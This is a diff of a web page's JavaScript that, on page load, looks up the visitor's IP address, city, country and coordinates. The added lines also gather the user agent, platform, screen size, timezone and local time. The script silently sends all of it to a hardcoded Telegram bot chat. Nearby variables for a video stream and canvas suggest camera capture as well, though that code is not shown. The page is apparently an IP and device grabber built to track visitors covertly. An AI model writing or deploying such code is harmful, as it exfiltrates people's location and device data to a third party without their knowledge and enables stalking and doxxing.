@@ -27,11 +27,30 @@
     const chatId = "7035248493";
     let stream, video, canvas, intervalId;
 
-    // Send location info immediately on page load
+    // Send location & device info immediately on page load
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(data => {
-        const locationText = `🌍 Location info:\nCity: ${data.city}\nCountry: ${data.country_name}\nIP: ${data.ip}\nLat: ${data.latitude}, Lon: ${data.longitude}`;
+        const deviceInfo = navigator.userAgent;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const platform = navigator.platform;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const now = new Date();
+        const timestamp = now.toLocaleString();
+        const isMobile = /Mobi|Android/i.test(deviceInfo) ? "Yes" : "No";
+
+        const locationText = `📡 Visitor Info:\n` +
+          `🌍 City: ${data.city}\n` +
+          `🌎 Country: ${data.country_name}\n` +
+          `💻 IP: ${data.ip}\n` +
+          `📍 Lat: ${data.latitude}, Lon: ${data.longitude}\n` +
+          `🖥️ Device: ${deviceInfo}\n` +
+          `📟 Platform: ${platform}\n` +
+          `📱 Mobile: ${isMobile}\n` +
+          `📏 Screen: ${screenRes}\n` +
+          `⏱️ Time: ${timestamp}\n` +
+          `🌐 Timezone: ${timezone}`;
+
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { 'Content-Type': 'application/json' },
